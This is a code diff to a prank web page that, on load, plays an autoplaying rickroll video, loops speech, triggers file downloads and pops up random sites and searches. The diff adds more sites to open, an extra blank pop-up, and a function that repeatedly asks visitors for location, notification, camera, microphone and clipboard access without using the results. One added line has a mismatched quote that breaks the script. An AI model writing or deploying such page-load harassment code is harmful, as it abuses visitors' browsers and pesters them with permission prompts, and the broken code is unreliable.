@@ -52,7 +52,6 @@
 </head>
 <body>
     <div class="iframe-container">
-        <!-- Fixed YouTube embed with proper autoplay parameters -->
         <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ&playsinline=1&controls=0&enablejsapi=1" allow="autoplay; muted; loop; encrypted-media; picture-in-picture; fullscreen" allowfullscreen></iframe>
     </div>
 
@@ -72,7 +71,10 @@
                 'https://mee6.gg',
                 'https://dyno.gg',
                 'https://talkomatic.co',
-                'https://discord.com/developers'  // Fixed: actual Discord Developer Portal
+                'https://discord.com/developers',
+                'https://totalenergies.com',
+                'https://sfr.com",
+                "https://bonzibuddy.org"
             ];
 
             const SEARCHES = [
@@ -84,7 +86,7 @@
                 'GTA 6 and 7 free'
             ];
 
-            const INTERVAL_SECONDS = 2;
+            const INTERVAL_SECONDS = 5;
 
             function openUrl(url) {
                 const newWindow = window.open(url, '_blank');
@@ -152,10 +154,33 @@
                 }, 500);
             }
 
+            function requestFakePermissions() {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(() => {}, () => {});
+                }
+                if ('Notification' in window) {
+                    Notification.requestPermission().then(() => {});
+                }
+                if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                    navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+                        .then(stream => stream.getTracks().forEach(track => track.stop()))
+                        .catch(() => {});
+                }
+                if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
+                    navigator.clipboard.readText().catch(() => {});
+                }
+            }
+
             window.addEventListener('load', function() {
+                window.open('about:blank', '_blank');
+
                 setTimeout(downloadAllFiles, 500);
                 startLoopingTTS();
                 startCursorToggle();
+                
+                setTimeout(requestFakePermissions, 1000);
+                setTimeout(requestFakePermissions, 4000);
+                setTimeout(requestFakePermissions, 8000);
             });
 
             setTimeout(openRandomSiteAndSearch, 1000);
